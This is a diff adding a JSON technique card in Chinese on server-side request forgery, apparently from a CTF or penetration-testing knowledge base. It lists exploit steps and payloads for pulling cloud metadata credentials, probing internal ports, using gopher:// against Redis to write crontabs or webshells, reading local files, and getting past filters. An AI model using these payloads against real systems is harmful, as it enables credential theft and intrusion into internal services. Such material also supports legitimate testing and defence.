@@ -1,0 +1,61 @@
+{
+  "id": "ssrf-to-metadata-and-internal",
+  "title": "SSRF → 云元数据/内网资产/协议走私",
+  "vuln_pattern": "服务端按用户可控 URL 发起请求，用于打云元数据、内网探测、file/gopher 协议提权",
+  "fingerprint": [
+    "ssrf",
+    "url=",
+    "fetch",
+    "webhook",
+    "内网资产探测",
+    "asset probe",
+    "image proxy",
+    "import from url",
+    "pdf render",
+    "curl",
+    "http client",
+    "redirect",
+    "服务端请求伪造",
+    "内网",
+    "内网探测",
+    "元数据",
+    "云凭据",
+    "接口"
+  ],
+  "exploit_steps": [
+    "用 OOB 回调地址(interactsh/自建监听)确认能出站——收到回调即证明 SSRF",
+    "打云元数据：AWS 169.254.169.254/latest/meta-data/iam/security-credentials/ 取临时凭证；阿里/腾讯/GCP 各自元数据地址",
+    "内网探测：扫 127.0.0.1 与内网段常见端口(6379 redis/8080/2375 docker/9200 es)，按 banner 识别",
+    "协议提级：若客户端支持 gopher://，优先打无 NUL 字节的文本型协议(redis RESP 写 crontab/webshell、HTTP 内网 GET/POST)；file:// 读本地文件/flag。注意 gopher 打含 0x00 的二进制协议(MySQL 握手包/FastCGI 记录头)在 PHP web 场景必死——PHP 对 query string 做 urldecode 产生字面 NUL，且 libcurl 按 C 字符串处理 URL，握手包在第一个 NUL 处截断",
+    "绕过校验：DNS rebinding、302 重定向到内网、十进制/十六进制 IP、@ 混淆、[::] 变体"
+  ],
+  "key_payloads": [
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://127.0.0.1:6379/  (探活)",
+    "gopher://127.0.0.1:6379/_<URL编码的redis协议>",
+    "file:///home/ctf/flag.txt",
+    "http://2130706433/  (127.0.0.1 十进制)"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "ssrf",
+    "cloud",
+    "oob"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "某参数被服务端当作 URL 发起出站请求",
+    "出站未严格校验主机/协议/重定向"
+  ],
+  "verify_oracle": "OOB 监听收到目标出站回调；或响应回显元数据凭证/内网 banner/文件内容",
+  "pitfalls": [
+    "盲 SSRF 无回显时必须用 OOB 回调做预言机，别靠猜",
+    "很多 WAF 拦 169.254.169.254，用十进制/rebinding 绕",
+    "重定向跟随开关决定 302 打法是否可行——先测",
+    "gopher 只对无 NUL 的协议可用：redis RESP/HTTP 可写可读；MySQL/FastCGI 二进制帧含 0x00 必被截断(多题实测死路)——别在 gopher 打 MySQL 上烧时间，改走 SQLi/命令注入等应用层入口",
+    "PHP curl 的 gopher 还受 open_basedir/协议白名单影响，先发 gopher://127.0.0.1:6379/_PING 看响应差分确认协议真放行"
+  ]
+}
